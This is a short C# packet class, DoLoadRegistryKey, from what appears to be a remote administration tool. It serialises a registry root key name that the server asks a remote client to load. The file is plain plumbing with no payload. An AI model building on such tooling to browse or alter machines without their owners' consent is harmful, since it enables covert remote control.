using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class DoLoadRegistryKey : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.DoLoadRegistryKey;
            }
        }

        [Index(0)]
        public virtual string rootKeyName { get; set; }

        public DoLoadRegistryKey()
        {
        }

        public DoLoadRegistryKey(string rootKeyName)
        {
            this.rootKeyName = rootKeyName;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
